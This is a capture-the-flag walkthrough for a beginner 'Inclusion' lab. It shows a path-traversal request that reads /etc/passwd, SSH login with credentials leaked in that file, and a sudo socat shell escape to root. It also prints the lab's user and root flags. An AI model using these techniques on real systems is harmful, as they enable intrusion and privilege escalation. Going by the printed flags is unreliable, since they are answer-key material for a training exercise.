# Inclusion

## Description

This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability. 

## Initial Scan

Let's start with an Nmap scan. The scan reveals two open ports:
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web

I started with the webpage and there is only one directory: `/article`. The webpage itself is very simple. It has a few articles which are accessible from that directory. Let's make things short. We know this machine is vulnerable to LFI (Local File Inclusion), so we can try the common things.

## LFI

The first thing I tried worked and I read the content of `/etc/passwd`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Inclusion/files]
└─$ curl -s "http://$IP/article?name=../../../../../etc/passwd"
<!DOCTYPE html>

<html>
    <body>

            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword             <----------------------
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

    </body>
</html>
~~~

As you can see the credentials for the only existing user on the machine is here, which means we can easily log in as that user. The passwords in a linux machine are usually saved as hashes in `/etc/shadow` but the developer probably needed the password to be here due to the codes:

Creds: `falconfeast:rootpassword`

## User Flag

Now we can connect via SSH and look for the flags:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Inclusion/files]
└─$ ssh falconfeast@$IP         
falconfeast@10.10.200.86's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 23 20:15:13 IST 2021

  System load:  0.08              Processes:           85
  Usage of /:   35.0% of 9.78GB   Users logged in:     0
  Memory usage: 65%               IP address for eth0: 10.10.200.86
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ id
uid=1000(falconfeast) gid=1000(falconfeast) groups=1000(falconfeast),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
~~~

You can find the user flag in the active directory:

~~~
falconfeast@inclusion:~$ ls
articles  user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799
~~~

User flag: `60989655118397345799`

## Root Flag

### PrivEsc

Now we need to obtain the root flag. I ran `sudo -l` to check my permissions and could run `socat` with sudo and no password:

~~~
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
~~~

I checked [GTFOBins](https://gtfobins.github.io/) and found a command that can gain us the root access:

~~~
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
~~~

### Root Flag

The command worked and now we are root, so we can simply navigate to `/root` and read the root flag:

~~~
cd /root
ls
root.txt
cat root.txt
42964104845495153909
~~~

Root flag: `42964104845495153909`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun hacking!

And have a good one! : )